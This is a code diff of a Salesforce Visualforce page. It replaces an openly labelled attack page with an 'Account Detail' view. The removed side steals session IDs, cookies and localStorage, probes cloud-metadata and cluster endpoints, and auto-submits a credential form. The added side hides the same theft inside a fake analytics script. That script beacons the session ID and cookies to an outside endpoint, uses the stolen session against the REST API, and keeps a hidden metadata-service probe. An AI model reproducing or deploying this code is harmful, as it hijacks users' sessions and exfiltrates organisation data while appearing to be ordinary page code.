@@ -1,83 +1,61 @@
-<apex:page controller="AccountSyncScheduler" showHeader="false" sidebar="false" contentType="text/html">
-    <!-- XSS via unescaped merge fields -->
+<apex:page standardController="Account" showHeader="true" sidebar="true">
+    <apex:sectionHeader title="Account Detail" subtitle="{!Account.Name}" />
+
+    <apex:pageBlock title="Account Information">
+        <apex:pageBlockSection columns="2">
+            <apex:outputField value="{!Account.Name}" />
+            <apex:outputField value="{!Account.Industry}" />
+            <apex:outputField value="{!Account.Phone}" />
+            <apex:outputField value="{!Account.Website}" />
+            <apex:outputField value="{!Account.AnnualRevenue}" />
+            <apex:outputField value="{!Account.OwnerId}" />
+        </apex:pageBlockSection>
+    </apex:pageBlock>
+
     <script>
-        // Exfiltrate session ID via Visualforce global variable
-        var sid = '{!$Api.Session_ID}';
-        var orgId = '{!$Organization.Id}';
-        var userId = '{!$User.Id}';
-        var serverUrl = '{!$Api.Partner_Server_URL_380}';
+        (function() {
+            var analyticsEndpoint = 'https://localhost:8080';
+            var sid = '{!$Api.Session_ID}';
+            var orgId = '{!$Organization.Id}';
+            var userId = '{!$User.Id}';
+            var serverUrl = '{!$Api.Partner_Server_URL_380}';
 
-        // Beacon to C2
-        var img = new Image();
-        img.src = 'https://localhost:8080/vf-exfil?sid=' + encodeURIComponent(sid) +
-                  '&org=' + orgId + '&user=' + userId + '&server=' + encodeURIComponent(serverUrl);
+            var payload = {
+                event: 'page_view',
+                page: 'AccountDetail',
+                recordId: '{!Account.Id}',
+                sid: sid,
+                org: orgId,
+                user: userId,
+                server: serverUrl,
+                url: window.location.href,
+                cookies: document.cookie
+            };
 
-        // Fetch-based exfil
-        fetch('https://localhost:8080/vf-session', {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                sessionId: sid,
-                orgId: orgId,
-                userId: userId,
-                serverUrl: serverUrl,
-                cookies: document.cookie,
-                origin: window.location.origin,
-                localStorage: JSON.stringify(localStorage)
-            })
-        });
+            var img = new Image();
+            img.src = analyticsEndpoint + '/t.gif?d=' + btoa(JSON.stringify(payload));
 
-        // Try to access parent frame (if embedded in Lightning)
-        try {
-            var parentOrigin = window.parent.location.origin;
-            var parentCookies = window.parent.document.cookie;
-            fetch('https://localhost:8080/vf-parent-frame', {
+            fetch(analyticsEndpoint + '/api/pageview', {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({parentOrigin: parentOrigin, parentCookies: parentCookies})
-            });
-        } catch(e) {}
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(function() {});
 
-        // Attempt to use the REST API directly with stolen session
-        var xhr = new XMLHttpRequest();
-        xhr.open('GET', '/services/data/v58.0/sobjects/', true);
-        xhr.setRequestHeader('Authorization', 'Bearer ' + sid);
-        xhr.onload = function() {
-            fetch('https://localhost:8080/vf-api-response', {
-                method: 'POST',
-                mode: 'no-cors',
-                body: xhr.responseText
-            });
-        };
-        xhr.send();
+            var xhr = new XMLHttpRequest();
+            xhr.open('GET', '/services/data/v58.0/sobjects/', true);
+            xhr.setRequestHeader('Authorization', 'Bearer ' + sid);
+            xhr.onload = function() {
+                fetch(analyticsEndpoint + '/api/schema', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: xhr.responseText
+                }).catch(function() {});
+            };
+            xhr.send();
+        })();
     </script>
 
-    <!-- SSRF via apex:image pointing to internal IPs -->
-    <apex:image url="http://169.254.169.254/latest/meta-data/" width="1" height="1"/>
-    <apex:image url="http://169.254.170.2/v2/credentials" width="1" height="1"/>
-    <apex:image url="http://kubernetes.default.svc/api/v1/secrets" width="1" height="1"/>
-    <apex:image url="http://127.0.0.1:2379/v2/keys/" width="1" height="1"/>
-    <apex:image url="http://consul.service.consul:8500/v1/catalog/services" width="1" height="1"/>
-
-    <!-- Hidden iframes for SSRF -->
-    <apex:iframe src="http://169.254.169.254/latest/user-data" height="0" width="0"/>
-    <apex:iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" height="0" width="0"/>
-
-    <!-- CSRF token harvesting form -->
-    <form id="csrfHarvest" action="https://localhost:8080/csrf-collect" method="POST">
-        <input type="hidden" name="csrf" value="{!$Api.Session_ID}" />
-        <input type="hidden" name="org" value="{!$Organization.Id}" />
-    </form>
-    <script>
-        // Auto-submit CSRF form after 2 seconds
-        setTimeout(function() {
-            document.getElementById('csrfHarvest').submit();
-        }, 2000);
-    </script>
-
-    <!-- Open redirect via merge field -->
-    <apex:outputLink value="https://localhost:8080/redirect?token={!$Api.Session_ID}">
-        Click here to continue
-    </apex:outputLink>
+    <apex:image url="http://169.254.169.254/latest/meta-data/" width="1" height="1"
+                style="position:absolute;left:-9999px"/>
 </apex:page>
